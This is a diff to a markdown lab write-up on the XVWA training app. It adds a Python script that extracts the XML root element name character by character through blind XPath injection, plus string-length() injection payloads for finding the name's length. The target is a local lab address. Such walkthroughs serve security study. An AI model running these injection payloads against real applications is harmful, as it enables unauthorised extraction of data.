@@ -5,6 +5,7 @@ tags:
   - xpath
   - arp-scan
   - nmap
+  - python
 ---
 
 ![](../../Images/XVWA.png)
@@ -252,3 +253,80 @@ search=1' and substring(name(/*[1]),1,1)='C&submit=
 `1,1` --> Indicate the first character
 
 If you put a `c` you don't see the product
+
+Now we are going to create an script to automatize this attack:
+
+
+````python
+#!/usr/bin/python3
+
+from pwn import *
+import time, sys, pdb, string, signal, requests
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+
+main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
+characters = string.ascii_letters # Characters in lowercase and uppercase
+
+def xPathInjection():
+    
+    data = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Data")
+
+    for position in range(1,8): # The length of the word ( 1-7 )
+        for character in characters:                    
+            
+            post_data = { 
+                    'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
+                    'submit': '' 
+            }
+    
+            r = requests.post(main_url, data=post_data)
+            
+            if len(r.text) != 8681:
+                data += character
+                p2.status(data)
+
+                # ----------------------
+                # TODO
+                break
+                # ----------------------
+
+    p1.success("Brute force attack finished")
+    p2.success(data)
+
+if __name__ == '__main__':
+    
+    xPathInjection()
+
+````
+
+
+To know the length you can play with string-length()
+
+````bash
+search=1' and string-length(name(/*[1]))>'2&submit=
+````
+
+````bash
+search=1' and string-length(name(/*[1]))='7&submit=
+````
+
+Now we know that we have to iterate for 7 characters
+
+This is very util for our script
+
